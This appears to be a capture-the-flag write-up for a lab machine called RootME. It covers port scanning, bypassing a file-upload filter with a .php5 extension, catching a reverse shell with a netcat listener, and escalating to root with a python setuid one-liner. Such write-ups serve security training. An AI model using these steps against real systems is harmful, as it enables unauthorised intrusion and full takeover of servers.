# RootME

## Data

IP address: `10.10.34.184`

## NMAP

```
# Nmap 7.92 scan initiated Sat Jul  2 10:30:06 2022 as: nmap -sV -Pn -oN nmap.txt 10.10.34.184
Nmap scan report for 10.10.34.184
Host is up (0.059s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  2 10:30:16 2022 -- 1 IP address (1 host up) scanned in 9.75 seconds

```

## Probing

### Enumeration

A few enumeration tools to check hidden pages

#### Feroxbuster

Found pages:

- `/uploads`
- `/panel`
- `/js`
- `/css`

#### GoBuster

#### Nikto

Both were not needed

### panel page

This allowed for a file upload. The extension is being scanned so php files are not allowed. A .php5 file is allowed tho.

### Uploads page

After the upload, we can execute the .php5 file to create a reverse shell. 

In our terminal, use the command `nc -l -p 5000` to create a netcat listener. In the php file, update to our ip and port. See php-reverse-shell.php5 in this directory for the upload code.

## Reverse shell

By doing the upload and execution, we created a reverse shell.

This shell has to be stabilized by running the command 

```python
python -c 'import pty; pty.spawn("/bin/bash")'

```

This does rely on python, so this might not be available always

After we established a stable shell, we can search for the regular user flag, which is in `/var/www/html` as `user.txt`

AFter that, we can try to privesc. 

## Privilege escalation

For this, using the file upload we can try linpeas. This checks the entire system for available paths to do privesc.

Linpeas found that python is configured to run as root, so this is usefull.

To create a root shell using python, the following command can be used:

```python
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Then we had a root shell, so in the `/root` the file `root.txt` held our flag